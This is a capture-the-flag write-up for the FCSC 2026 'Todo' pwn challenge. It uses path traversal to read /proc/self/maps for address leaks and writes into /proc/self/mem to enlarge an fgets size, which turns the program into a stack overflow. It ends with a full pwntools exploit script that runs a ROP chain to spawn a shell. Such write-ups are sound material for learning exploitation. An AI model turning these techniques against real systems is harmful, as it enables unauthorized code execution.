+++
title = 'FCSC 2026 Todo'
date = 2026-08-06T10:24:02+02:00
tags = ["pwn", "Heap", "LFI", "/proc/self/mem"]
categories = ["Hackropole"]
+++

**Challenge Name : Todo**  
**Difficulty : ★★**  
**Number of solves : 30**

This post is in my series of writeup on FCSC 2026, since it's been long since I did the competition I restarted doing the challenges recently, as well as the 2 I didn't solve during the competition.  
Todo was a 2 Star challenge and the easiest of the 2 star challenges.  
You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/FCSC2026/Todo/).

## TLDR ##
- The challenge allows us to create and read todo lists
- We can create and write into files in a folder **./lists**
- No check on the path of the folder allow us to gain memory leak by reading **/proc/self/maps**
- An option allows us to write a 'X' anywhere in a file
- Abuse the path traversal by writing 'X' in **/proc/self/mem** to increase size taken by fgets
- Use our fabricated overflow for the win

# Chal Analysis #

First of all the result of the checksec.  
![checksec](/images/FCSC2026/Todo/checksec.png)  
There is Partial RELRO, however the important thing to notice is that there is no canary which almost certainly means that there is an overflow somewhere.

The code was not provided for this challenge, we had to reverse it. However the reversing was not that hard. First let's take a look at the main.
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  while ( 1 )
  {
    puts("Choose an option:");
    puts("0. Exit");
    puts("1. Create a to-do list");
    puts("2. Read a to-do list");
    puts("3. Mark as done");
    printf("> ");
    v4 = get_int();
    if ( !v4 )
      break;
    switch ( v4 )
    {
      case 1:
        create_list();
        break;
      case 2:
        read_list();
        break;
      case 3:
        edit_list();
        break;
      default:
        puts("Invalid choice!");
        break;
    }
  }
  return 0;
}
```
We have what actually look closer to a heap challenge than a buffer overflow one. We have 3 options for managing todo lists. First **create_list**
```C
  strcpy(s, "./lists/");
  s[9] = 0;
  memset(&ptr[1], 0, 72);
  puts("List name:");
  printf("> ");
  fgets(&s[8], 120, stdin);
  s[strcspn(s, "\n")] = 0;
  stream = fopen(s, "w");
  if ( !stream )
    return puts("Error while creating to-do list");
  puts("Enter items (empty line to stop)");
  while ( 1 )
  {
    printf("[ ] ");
    memset((char *)ptr + 4, 32, 0x4BuLL);
    fgets((char *)ptr + 4, 76, stdin);
    v19 = strcspn((const char *)ptr + 4, "\n");
    if ( !v19 )
      break;
    *((_BYTE *)ptr + v19 + 4) = 32;
    fwrite(ptr, 0x50uLL, 1uLL, stream);
    fwrite("\n", 1uLL, 1uLL, stream);
  }
  return fclose(stream);
```
It allows us to create a file in folder **./lists**, it uses fgets to get our list name and we can then enter each element of the todo starting with brackets. I won't show read_list as it simply read and print the content of a file.
```C
  strcpy(s, "./lists/");
  s[9] = 0;
  *(_WORD *)&s[10] = 0;
  *(_DWORD *)&s[12] = 0;
  puts("List name:");
  printf("> ");
  fgets(&s[8], 120, stdin);
  s[strcspn(s, "\n")] = 0;
  stream = fopen(s, "r+");
  if ( !stream )
    return puts("To-do list does not exist");
  puts("Check index:");
  printf("> ");
  v21 = get_int("> ", "r+", v1, v2, v3, v4, *(_QWORD *)s, *(_QWORD *)&s[8], v6, v7, v8, v9, v10, v11, v12, v13);
  off = 81 * v21 + 1;
  fseek(stream, off, 0);
  fwrite("X", 1uLL, 1uLL, stream);
  return fclose(stream);
```
Edit list allows us to edit a list, or more like mark it done. We can write an **X** at any offset we provide in the file.

# Vulnerabilities #
As I said the lack of canary means there is an overflow to exploit there, however there was no obvious overflow in the disassembly. The most obvious vulnerability there was the lack of check on the path of the file provided for our todo list. That means that we can use path traversal to read from any file we want.  
That allows us to simply use the read option on **/proc/self/maps** to gain memory leaks.  
![leaks](/images/FCSC2026/Todo/leaks.png)

## Second Vulnerability
Now as I said there was no overflow while looking at the pseudocode. So I simply looked at the only option available allowing us to write data: **edit_list**.  
If you recall it allows us to write an 'X' at any offset in a file that we want. And we know thanks to the path traversal we can write it in any file we want.  
That's the main trick of the challenge and main difficulty if you don't know this.  

Basically we can abuse **/proc/self/mem** to write directly into the memory of the program. The nice trick to know is that if you are able to write directly into this file it "bypasses" memory protections : meaning if we used normal memory access we can't write into a r-x zone since we don't have write permissions. However if we instead write in **/proc/self/mem** we can write in any zone we want even without **w** permissions.  

## Crafting a Stack Buffer Overflow
Since we don't have canary the logical thing is to exploit an overflow. We don't have one in code, so the idea is simply to craft it. Simply put fgets take a valid size so far that won't cause an overflow: so instead we will write directly into the binary memory to overwrite the size taken by fgets into something much bigger.  
This way the buffer on the stack stays the same but we can suddenly send way too much data into it.

## Exploitation ##
The exploitation is straightforward. We start by using read with path traversal to leak from **/proc/self/maps**. Then we use edit to write into **/proc/self/mem** at the right offset of fgets size : I chose to overwrite it with two X to give a huge size. Then I pick first option and send the ropchain.
```python
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'> ', PATH_TRAVERSAL+b'proc/self/maps') #leak with maps

leak = r.recvuntil(b"Choose an option:", drop=True).decode()

pie_base = None
libc_base = None

for line in leak.split('\n'):
    line = line.strip()
    if not line:
        continue
    parts = line.split()
    if len(parts) < 6:
        continue
    addr_range = parts[0]
    pathname = parts[-1]
    start_addr = int(addr_range.split('-')[0], 16)

    if 'todo' in pathname and pie_base is None:
        pie_base = start_addr
    if 'libc' in pathname and libc_base is None:
        libc_base = start_addr

log.info(f'LIBC BASE @ {hex(libc_base)}')
log.info(f'PIE BASE @ {hex(pie_base)}')

pop_rdi = libc_base + 0x2a145
ret     = libc_base + 0x2846b
bin_sh  = libc_base + next(libc.search(b'/bin/sh'))
system_addr  = libc_base + libc.symbols['system']

index = (((pie_base+OFFSET) - 1) * MODINV_81) % MOD #calculation of fgets size offset in binary

r.sendlineafter(b'> ', b'3') #edit list option
r.sendlineafter(b"> ", PATH_TRAVERSAL+b'proc/self/mem')
r.sendlineafter(b"> ", str(index).encode()) #send the offset where to put X

index = (((pie_base+(OFFSET+1)) - 1) * MODINV_81) % MOD #second offset

r.sendlineafter(b'> ', b'3')
r.sendlineafter(b"> ", PATH_TRAVERSAL+b'proc/self/mem')
r.sendlineafter(b"> ", str(index).encode())
#finally the overflow and ropchain
payload = b'A'*136
payload += b'B'*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_addr)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', payload)

r.sendline()
r.sendline(b'cat flag.txt')

r.interactive()

```
![shell](/images/FCSC2026/History/shell.png)

## Conclusion ##
The main difficulty of this challenge lied in knowing about the trick with **/proc/self/mem**, but if you knew it it wasn't too hard. The idea of crafting the overflow is original, but the lack of canary was a very strong hint into this being the strategy.
